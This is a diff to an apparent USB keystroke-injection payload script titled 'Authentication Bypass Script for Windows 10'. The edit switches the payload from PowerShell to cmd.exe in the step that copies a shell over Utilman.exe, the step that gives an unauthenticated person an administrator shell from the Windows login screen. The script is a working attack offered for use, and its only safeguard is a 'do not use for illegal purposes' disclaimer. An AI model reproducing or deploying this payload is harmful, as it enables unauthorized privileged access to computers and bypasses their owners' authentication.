@@ -1,6 +1,6 @@
 REM Authentication Bypass Script for Windows 10
 REM AUTHOR Crashwire
-REM DESCRIPTION: Exploits the utilman binary to bypass user authentication and grant user an administrator powershell session
+REM DESCRIPTION: Exploits the utilman binary to bypass user authentication and grant user an administrator cmd.exe session
 REM **DO NOT USE FOR ILLEGAL PURPOSES**
 ATTACKMODE HID STORAGE
 DELAY 1000
@@ -43,7 +43,7 @@ ENTER
 DELAY 1000
 
 REM Replace Utilman.exe with cmd.exe
-STRING copy C:\Windows\System32\powershell.exe C:\Windows\System32\Utilman.exe
+STRING copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
 ENTER
 DELAY 1000
 
